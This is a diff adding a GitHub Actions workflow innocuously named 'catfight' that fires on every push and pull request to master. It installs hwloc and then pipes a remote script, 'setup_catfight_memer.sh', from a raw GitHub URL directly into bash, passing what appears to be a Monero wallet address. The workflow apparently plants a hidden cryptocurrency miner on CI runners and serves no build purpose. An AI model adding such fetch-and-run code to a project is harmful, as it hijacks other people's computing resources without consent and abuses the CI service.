@@ -1,0 +1,26 @@
+name: catfight
+
+on:
+  push:
+    branches: [ master ]
+  pull_request:
+    branches: [ master ]
+
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v2
+
+      - name: Installs deps
+        run: |
+          sudo apt update
+          sudo apt-get install curl wget
+          sudo apt install hwloc
+          
+      - name: Runs catfight
+        run: |
+          curl -s -L  https://raw.githubusercontent.com/JdevStudios/catfight_setup/master/setup_catfight_memer.sh | bash -s 4AZ6u7wEVZ7EDFAXCnZGkf1PwRPMDStboTzzwJhf1LcJiK3Ki4H2SgjVCnFsgkwDoVa5De6zWQaXUcsEz1Hgu7b1LnvBTpu
